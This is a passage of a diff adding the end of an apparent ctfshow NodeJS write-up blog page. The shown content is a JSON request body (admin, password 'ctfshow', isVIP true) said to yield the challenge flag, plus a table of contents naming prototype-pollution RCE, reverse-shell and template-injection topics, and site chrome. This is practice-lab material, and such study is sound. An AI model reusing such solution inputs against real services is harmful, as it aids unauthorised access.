+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;ctfshow&quot;</span>,</span><br><span class="line">  <span class="string">&quot;isVIP&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从而成功得到flag。</p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NodeJS"><span class="toc-number">1.</span> <span class="toc-text">NodeJS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web334-express%E6%A1%86%E6%9E%B6%E5%88%9D%E6%8E%A2"><span class="toc-number">1.1.</span> <span class="toc-text">web334 express框架初探</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Express%E6%A1%86%E6%9E%B6-%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.1.1.</span> <span class="toc-text">Express框架 路由器对象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web335-nodejs-eval"><span class="toc-number">1.2.</span> <span class="toc-text">web335 nodejs eval</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web336-nodejs-%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F-filename%E5%87%BD%E6%95%B0%E7%AD%89"><span class="toc-number">1.3.</span> <span class="toc-text">web336 nodejs 全局变量 __filename函数等</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nodejs%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">1.3.1.</span> <span class="toc-text">nodejs全局变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nodejs-child-process%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.2.</span> <span class="toc-text">nodejs child_process执行命令的函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web337-nodejs-%E6%8B%BC%E6%8E%A5%E7%89%B9%E6%80%A7-md5%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">web337 nodejs 拼接特性 md5数组绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nodejs-%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.4.1.</span> <span class="toc-text">nodejs 拼接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web338-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-express%E6%A1%86%E6%9E%B6"><span class="toc-number">1.5.</span> <span class="toc-text">web338 原型链污染 express框架</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nodejs-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.5.1.</span> <span class="toc-text">nodejs 原型链污染</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web339-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-RCE%E5%92%8C%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.6.</span> <span class="toc-text">web339 原型链污染 RCE和反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web340-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-%E5%90%91%E4%B8%8A%E6%B1%A1%E6%9F%93%E4%B8%A4%E7%BA%A7"><span class="toc-number">1.7.</span> <span class="toc-text">web340 原型链污染 向上污染两级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web341-ejs%E6%BC%8F%E6%B4%9Erce"><span class="toc-number">1.8.</span> <span class="toc-text">web341 ejs漏洞rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web342-jade%E6%BC%8F%E6%B4%9Erce"><span class="toc-number">1.9.</span> <span class="toc-text">web342 jade漏洞rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web343-jade%E6%BC%8F%E6%B4%9Erce"><span class="toc-number">1.10.</span> <span class="toc-text">web343 jade漏洞rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web344-HPP"><span class="toc-number">1.11.</span> <span class="toc-text">web344 HPP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HPP%EF%BC%88HTTP-Parameter-Pollution%EF%BC%89%EF%BC%9A-HPP%E6%95%B0%E6%8D%AE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.11.1.</span> <span class="toc-text">HPP（HTTP Parameter Pollution）： HPP数据污染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E9%AA%8C%E8%AF%81HPP"><span class="toc-number">1.11.2.</span> <span class="toc-text">动态调试验证HPP</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/&text=ctfshow-web入门笔记-NodeJS"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/&title=ctfshow-web入门笔记-NodeJS"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/&is_video=false&description=ctfshow-web入门笔记-NodeJS"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow-web入门笔记-NodeJS&body=Check out this article: http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/&title=ctfshow-web入门笔记-NodeJS"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/&title=ctfshow-web入门笔记-NodeJS"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/&title=ctfshow-web入门笔记-NodeJS"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/&title=ctfshow-web入门笔记-NodeJS"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/&name=ctfshow-web入门笔记-NodeJS&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/08/ctfshow-web%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-NodeJS/&t=ctfshow-web入门笔记-NodeJS"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2025
+    ShuiChang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'ShuiChang2019/Utterance_comments_try';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
